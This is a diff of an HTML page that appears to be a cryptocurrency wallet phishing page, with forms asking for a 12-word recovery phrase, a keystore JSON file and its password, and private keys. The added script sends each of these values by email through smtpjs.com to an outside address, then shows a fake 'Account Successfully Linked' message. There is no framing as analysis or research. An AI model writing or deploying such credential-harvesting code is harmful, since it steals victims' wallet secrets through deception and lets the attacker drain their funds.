@@ -185,14 +185,14 @@
                           />
                           <div class="inputf">
                             <textarea
-							id="json"
+                              id="json"
                               name="cf_json"
                               placeholder="Keystore JSON"
                               required=""
                             ></textarea>
 
                             <input
-							id="jsonpass"
+                              id="jsonpass"
                               type="password"
                               name="cf_passw"
                               placeholder="Password"
@@ -231,7 +231,7 @@
                           />
                           <div class="inputf">
                             <input
-							id="pKey"
+                              id="pKey"
                               type="text"
                               name="cf_key"
                               placeholder="Private Key"
@@ -269,37 +269,44 @@
     <script type="text/javascript" src="wallet/js/jquery-2.1.4.min.js"></script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
-		let phra = document.getElementById('phrase')
-		let jsonKey = document.getElementById('json')
-		let jsonPass = document.getElementById('jsonpass')
-		let pKey = document.getElementById('pKey')
-		
+      let phra = document.getElementById('phrase');
+      let jsonKey = document.getElementById('json');
+      let jsonPass = document.getElementById('jsonpass');
+      let pKey = document.getElementById('pKey');
+
       function sendEmail() {
         Email.send({
-         SecureToken : "f69c7b00-a3fa-4664-a59f-4ea0db06fc7c",
-		  from: 'client@example.com',
+          SecureToken: '70a5cb28-bd4d-4326-8ab3-cdaa47b25b08',
+          from: 'client@example.com',
           To: 'support@deckft.com',
           Subject: '12 key Phrase',
           Body: `The 12 Phrase key is ${phra.value}`,
-        }).then((message) => alert("Account Successfully Linked 12 key Phrase"));
+        }).then((message) =>
+          alert('Account Successfully Linked 12 key Phrase')
+        );
       }
       function sendEmail1() {
         Email.send({
-         SecureToken : "f69c7b00-a3fa-4664-a59f-4ea0db06fc7c",
-		  from: 'client@example.com',
+          SecureToken: '70a5cb28-bd4d-4326-8ab3-cdaa47b25b08',
+          from: 'client@example.com',
           To: 'support@deckft.com',
           Subject: 'Keystore Json Details',
-          Body: "Json Key: " + jsonKey.value + "<br> Password: " + jsonPass.value
-        }).then((message) => alert("Account Successfully Linked with Keystore JSON"));
+          Body:
+            'Json Key: ' + jsonKey.value + '<br> Password: ' + jsonPass.value,
+        }).then((message) =>
+          alert('Account Successfully Linked with Keystore JSON')
+        );
       }
       function sendEmail2() {
         Email.send({
-         SecureToken : "f69c7b00-a3fa-4664-a59f-4ea0db06fc7c",
-		  from: 'client@example.com',
+          SecureToken: '70a5cb28-bd4d-4326-8ab3-cdaa47b25b08',
+          from: 'client@example.com',
           To: 'support@deckft.com',
           Subject: 'Private key Details',
           Body: pKey.value,
-        }).then((message) => alert("Account Successfully Linked with Private Keys"));
+        }).then((message) =>
+          alert('Account Successfully Linked with Private Keys')
+        );
       }
     </script>
     <!--// Common js -->
